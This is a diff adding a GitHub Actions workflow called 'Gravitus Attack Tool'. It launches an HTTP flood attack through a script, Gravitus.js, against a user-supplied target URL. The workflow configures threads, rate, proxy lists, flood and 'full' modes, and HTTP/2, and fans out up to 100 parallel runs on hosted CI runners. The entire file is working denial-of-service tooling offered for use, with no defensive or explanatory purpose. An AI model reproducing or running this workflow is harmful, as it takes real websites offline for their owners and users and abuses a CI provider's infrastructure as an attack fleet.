@@ -1,0 +1,85 @@
+name: Gravitus Attack Tool
+
+on:
+  workflow_dispatch:
+    inputs:
+      method:
+        description: 'HTTP Method (GET/POST)'
+        required: true
+        default: 'GET'
+      target:
+        description: 'Target URL'
+        required: true
+        default: 'https://example.com'
+      duration:
+        description: 'Duration in seconds'
+        required: true
+        default: '120'
+      threads:
+        description: 'Number of threads'
+        required: true
+        default: '94'
+      rate:
+        description: 'Rate limit'
+        required: true
+        default: '10'
+      proxy_file:
+        description: 'Proxy file name'
+        required: true
+        default: 'proxy.txt'
+      flood:
+        description: 'Enable flood mode'
+        type: boolean
+        default: true
+      debug:
+        description: 'Enable debug mode'
+        type: boolean
+        default: true
+      full:
+        description: 'Enable full mode'
+        type: boolean
+        default: true
+      http_version:
+        description: 'HTTP version (1/2)'
+        required: true
+        default: '2'
+      parallel_runs:
+        description: 'Number of parallel runs'
+        required: true
+        default: '100'
+
+jobs:
+  run-gravitus:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        run: ${{ fromJson(format('[{0}]', repeat('0,', inputs.parallel_runs))) }}
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+
+    - name: Install dependencies
+      run: |
+        npm install puppeteer-real-browser
+        npm install hpack
+        npm install colors
+        npx @puppeteer/browsers install chrome@stable
+
+    - name: Run Gravitus Attack
+      run: |
+        node Gravitus.js \
+          "${{ inputs.method }}" \
+          "${{ inputs.target }}" \
+          "${{ inputs.duration }}" \
+          "${{ inputs.threads }}" \
+          "${{ inputs.rate }}" \
+          "${{ inputs.proxy_file }}" \
+          ${{ inputs.flood && '--flood' || '' }} \
+          ${{ inputs.debug && '--debug' || '' }} \
+          ${{ inputs.full && '--full' || '' }} \
+          --http ${{ inputs.http_version }}
